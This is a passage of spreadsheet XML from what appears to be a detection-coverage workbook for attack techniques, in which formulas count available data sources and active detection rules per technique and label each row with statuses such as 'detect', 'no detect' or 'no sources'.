      </c>
      <c r="C66" t="s">
        <v>633</v>
      </c>
      <c r="D66" t="s">
        <v>6</v>
      </c>
      <c r="E66" t="s">
        <v>634</v>
      </c>
      <c r="F66" s="9">
        <f t="shared" ref="F66:F129" si="1">LEN(E66)-LEN(SUBSTITUTE(E66,",",""))+1</f>
        <v>2</v>
      </c>
      <c r="G66" s="9" cm="1">
        <f t="array" ref="G66">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H66" s="9" t="str" cm="1">
        <f t="array" ref="H66">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I66" s="9" t="str" cm="1">
        <f t="array" ref="I66">IF(SUM(IF($C66=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C66=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J66" s="9" t="str" cm="1">
        <f t="array" ref="J6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6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M66" s="9" cm="1">
        <f t="array" ref="M66">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N66" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O66" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P66" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S6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6" t="s">
        <v>368</v>
      </c>
      <c r="U66" t="s">
        <v>635</v>
      </c>
      <c r="W66" t="b">
        <v>1</v>
      </c>
      <c r="X66" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="67" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A67" t="s">
        <v>596</v>
      </c>
      <c r="B67" t="s">
        <v>636</v>
      </c>
      <c r="C67" t="s">
        <v>637</v>
      </c>
      <c r="D67" t="s">
        <v>6</v>
      </c>
      <c r="E67" t="s">
        <v>638</v>
      </c>
      <c r="F67" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G67" s="9" cm="1">
        <f t="array" ref="G67">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H67" s="9" t="str" cm="1">
        <f t="array" ref="H67">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I67" s="9" t="str" cm="1">
        <f t="array" ref="I67">IF(SUM(IF($C67=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C67=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J67" s="9" t="str" cm="1">
        <f t="array" ref="J6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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M67" s="9" cm="1">
        <f t="array" ref="M67">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N67" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O67" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P67" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S6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7" t="s">
        <v>503</v>
      </c>
      <c r="U67" t="s">
        <v>639</v>
      </c>
      <c r="W67" t="b">
        <v>1</v>
      </c>
      <c r="X67" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="68" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A68" t="s">
        <v>596</v>
      </c>
      <c r="B68" t="s">
        <v>640</v>
      </c>
      <c r="C68" t="s">
        <v>641</v>
      </c>
      <c r="D68" t="s">
        <v>6</v>
      </c>
      <c r="E68" t="s">
        <v>642</v>
      </c>
      <c r="F68" s="9">
        <f t="shared" si="1"/>
        <v>1</v>
      </c>
      <c r="G68" s="9" cm="1">
        <f t="array" ref="G68">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H68" s="9" t="str" cm="1">
        <f t="array" ref="H68">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I68" s="9" t="str" cm="1">
        <f t="array" ref="I68">IF(SUM(IF($C68=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C68=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J68" s="9" t="str" cm="1">
        <f t="array" ref="J6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8" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M68" s="9" cm="1">
        <f t="array" ref="M68">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N68" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O68" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P68" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S6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8" t="s">
        <v>643</v>
      </c>
      <c r="U68" t="s">
        <v>644</v>
      </c>
      <c r="W68" t="b">
        <v>1</v>
      </c>
      <c r="X68" t="s">
        <v>596</v>
      </c>
    </row>
    <row r="69" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A69" t="s">
        <v>645</v>
      </c>
      <c r="B69" t="s">
        <v>645</v>
      </c>
      <c r="C69" t="s">
        <v>54</v>
      </c>
      <c r="D69" t="s">
        <v>646</v>
      </c>
      <c r="E69" t="s">
        <v>647</v>
      </c>
      <c r="F69" s="9">
        <f t="shared" si="1"/>
        <v>6</v>
      </c>
      <c r="G69" s="9" cm="1">
        <f t="array" ref="G69">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H69" s="9" cm="1">
        <f t="array" ref="H69">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I69" s="9" t="str" cm="1">
        <f t="array" ref="I69">IF(SUM(IF($C69=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C69=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J69" s="9" cm="1">
        <f t="array" ref="J6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69" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M69" s="9" cm="1">
        <f t="array" ref="M69">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N69" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O69" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P69" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S6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9" t="s">
        <v>425</v>
      </c>
      <c r="U69" t="s">
        <v>648</v>
      </c>
      <c r="V69" t="s">
        <v>649</v>
      </c>
      <c r="W69" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="70" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A70" t="s">
        <v>645</v>
      </c>
      <c r="B70" t="s">
        <v>650</v>
      </c>
      <c r="C70" t="s">
        <v>651</v>
      </c>
      <c r="D70" t="s">
        <v>646</v>
      </c>
      <c r="E70" t="s">
        <v>652</v>
      </c>
      <c r="F70" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G70" s="9" cm="1">
        <f t="array" ref="G70">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H70" s="9" t="str" cm="1">
        <f t="array" ref="H70">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I70" s="9" t="str" cm="1">
        <f t="array" ref="I70">IF(SUM(IF($C70=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C70=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J70" s="9" t="str" cm="1">
        <f t="array" ref="J7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70" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M70" s="9" cm="1">
        <f t="array" ref="M70">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N70" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O70" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P70" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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70" t="s">
        <v>386</v>
      </c>
      <c r="U70" t="s">
        <v>653</v>
      </c>
      <c r="V70" t="s">
        <v>654</v>
      </c>
      <c r="W70" t="b">
        <v>1</v>
      </c>
      <c r="X70" t="s">
        <v>645</v>
      </c>
    </row>
    <row r="71" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A71" t="s">
        <v>645</v>
      </c>
      <c r="B71" t="s">
        <v>655</v>
      </c>
      <c r="C71" t="s">
        <v>656</v>
      </c>
      <c r="D71" t="s">
        <v>646</v>
      </c>
      <c r="E71" t="s">
        <v>657</v>
      </c>
      <c r="F71" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G71" s="9" cm="1">
        <f t="array" ref="G71">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H71" s="9" t="str" cm="1">
        <f t="array" ref="H71">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I71" s="9" t="str" cm="1">
        <f t="array" ref="I71">IF(SUM(IF($C71=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C71=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J71" s="9" t="str" cm="1">
        <f t="array" ref="J7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71" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M71" s="9" cm="1">
        <f t="array" ref="M71">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N71" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O71" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P71" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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71" t="s">
        <v>658</v>
      </c>
      <c r="U71" t="s">
        <v>659</v>
      </c>
      <c r="V71" t="s">
        <v>649</v>
      </c>
      <c r="W71" t="b">
        <v>1</v>
      </c>
      <c r="X71" t="s">
        <v>645</v>
      </c>
    </row>
    <row r="72" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A72" t="s">
        <v>645</v>
      </c>
      <c r="B72" t="s">
        <v>660</v>
      </c>
      <c r="C72" t="s">
        <v>661</v>
      </c>
      <c r="D72" t="s">
        <v>646</v>
      </c>
      <c r="E72" t="s">
        <v>662</v>
      </c>
      <c r="F72" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G72" s="9" cm="1">
        <f t="array" ref="G72">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H72" s="9" t="str" cm="1">
        <f t="array" ref="H72">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I72" s="9" t="str" cm="1">
        <f t="array" ref="I72">IF(SUM(IF($C72=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C72=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J72" s="9" t="str" cm="1">
        <f t="array" ref="J7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72" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M72" s="9" cm="1">
        <f t="array" ref="M72">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N72" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O72" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P72" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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72" t="s">
        <v>386</v>
      </c>
      <c r="U72" t="s">
        <v>663</v>
      </c>
      <c r="V72" t="s">
        <v>649</v>
      </c>
      <c r="W72" t="b">
        <v>1</v>
      </c>
      <c r="X72" t="s">
        <v>645</v>
      </c>
    </row>
    <row r="73" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A73" t="s">
        <v>645</v>
      </c>
      <c r="B73" t="s">
        <v>664</v>
      </c>
      <c r="C73" t="s">
        <v>665</v>
      </c>
      <c r="D73" t="s">
        <v>646</v>
      </c>
      <c r="E73" t="s">
        <v>657</v>
      </c>
      <c r="F73" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G73" s="9" cm="1">
        <f t="array" ref="G73">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H73" s="9" t="str" cm="1">
        <f t="array" ref="H73">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I73" s="9" t="str" cm="1">
        <f t="array" ref="I73">IF(SUM(IF($C73=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C73=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J73" s="9" t="str" cm="1">
        <f t="array" ref="J7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73" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M73" s="9" cm="1">
        <f t="array" ref="M73">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N73" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O73" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P73" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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73" t="s">
        <v>666</v>
      </c>
      <c r="U73" t="s">
        <v>667</v>
      </c>
      <c r="V73" t="s">
        <v>668</v>
      </c>
      <c r="W73" t="b">
        <v>1</v>
      </c>
      <c r="X73" t="s">
        <v>645</v>
      </c>
    </row>
    <row r="74" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A74" t="s">
        <v>645</v>
      </c>
      <c r="B74" t="s">
        <v>669</v>
      </c>
      <c r="C74" t="s">
        <v>670</v>
      </c>
      <c r="D74" t="s">
        <v>646</v>
      </c>
      <c r="E74" t="s">
        <v>657</v>
      </c>
      <c r="F74" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G74" s="9" cm="1">
        <f t="array" ref="G74">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H74" s="9" t="str" cm="1">
        <f t="array" ref="H74">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I74" s="9" t="str" cm="1">
        <f t="array" ref="I74">IF(SUM(IF($C74=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C74=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J74" s="9" t="str" cm="1">
        <f t="array" ref="J7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74" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M74" s="9" cm="1">
        <f t="array" ref="M74">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N74" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O74" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P74" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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74" t="s">
        <v>658</v>
      </c>
      <c r="U74" t="s">
        <v>671</v>
      </c>
      <c r="V74" t="s">
        <v>672</v>
      </c>
      <c r="W74" t="b">
        <v>1</v>
      </c>
      <c r="X74" t="s">
        <v>645</v>
      </c>
    </row>
    <row r="75" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A75" t="s">
        <v>673</v>
      </c>
      <c r="B75" t="s">
        <v>673</v>
      </c>
      <c r="C75" t="s">
        <v>148</v>
      </c>
      <c r="D75" t="s">
        <v>10</v>
      </c>
      <c r="E75" t="s">
        <v>674</v>
      </c>
      <c r="F75" s="9">
        <f t="shared" si="1"/>
        <v>6</v>
      </c>
      <c r="G75" s="9" cm="1">
        <f t="array" ref="G75">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H75" s="9" cm="1">
        <f t="array" ref="H75">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I75" s="9" t="str" cm="1">
        <f t="array" ref="I75">IF(SUM(IF($C75=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C75=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J75" s="9" t="str" cm="1">
        <f t="array" ref="J7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75" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M75" s="9" cm="1">
